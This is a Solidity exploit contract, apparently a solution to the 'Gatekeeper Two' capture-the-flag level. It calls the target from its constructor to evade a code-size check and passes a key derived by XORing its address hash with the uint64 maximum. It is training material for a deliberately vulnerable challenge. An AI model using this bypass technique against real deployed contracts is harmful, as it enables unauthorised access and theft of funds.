// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IGatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(IGatekeeperTwo target) {
        require(
            target.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max)),
            "GatekeeperTwo: Wrong res"
        );

        require(msg.sender == target.entrant(), "GatekeeperTwo: Attack failed");
    }
}
